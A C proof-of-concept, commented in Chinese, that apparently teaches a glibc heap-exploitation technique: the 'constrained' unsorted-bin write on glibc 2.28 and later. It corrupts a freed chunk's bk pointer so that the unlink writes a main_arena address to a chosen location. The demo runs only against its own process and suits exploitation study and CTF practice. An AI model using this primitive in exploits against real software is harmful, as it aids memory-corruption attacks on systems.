#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * 这是 glibc 2.28 之后才能用的"受约束 unsorted 写"，和旧版那种目标初值
 * 任意的写法不同。摘链之前，源码会先做一次比较：
 *
 *     bck = victim->bk;
 *     if (bck->fd != victim) abort();
 *     bck->fd = unsorted_chunks(av);
 *
 * 因此目标 qword 必须提前就等于 victim 的 chunk header 地址，否则会直接
 * abort。如果题目已经有一次写入或数据搬运的能力，能够提前把这个前置条件
 * 建立起来，那么 unsorted 摘链仍然可以把 main_arena 附近的地址写过去。
 * 本 PoC 特意把这种先比较后写入的受约束写法，和 2.23~2.27 那种经典的
 * 无条件写法区分开来。
 */

int main(void)
{
    setbuf(stdout, NULL);

    /* request=0x410 -> chunk size=0x420，大小超出 small tcache 的范围。 */
    unsigned long *victim_user = malloc(0x410);
    /* guard 的大小也要超过 tcache 上限，否则 2.43 上第一次 free 时可能
     * 会顺带延迟初始化 tcache，导致内部分配从 top 切割或改写到紧邻
     * victim 的 chunk header，干扰后续判断。 */
    void *guard = malloc(0x410);
    assert(victim_user != NULL && guard != NULL);

    /* 提前触发 tcache 的初始化，避免它的初始化时机落在待测的 unsorted
     * 路径中间，干扰对结果的判断。 */
    void *small = malloc(0x20);
    assert(small != NULL);
    free(small);

    free(victim_user);

    unsigned long *victim_chunk = victim_user - 2;
    unsigned long unsorted_head = victim_user[0]; /* free 之后 fd 会指向 unsorted head */
    volatile unsigned long target = (unsigned long)victim_chunk;

    /*
     * 漏洞模拟：把 victim->bk 改写成 target - 0x10，这样内部计算出的
     * bck->fd 正好落在 target 上；由于 target 已经提前被设置成
     * victim_chunk，2.28 及之后版本的一致性检查就能顺利通过。
     */
    victim_user[1] = (unsigned long)((unsigned char *)&target - 0x10);

    void *again = malloc(0x410);
    assert(again == victim_user);

    /* 摘链的最后一步会把 bck->fd 改成 unsorted_chunks(av)。 */
    assert(target == unsorted_head);
    assert(target != (unsigned long)victim_chunk);

    puts("[+] unsorted：受约束写成功");
    return 0;
}
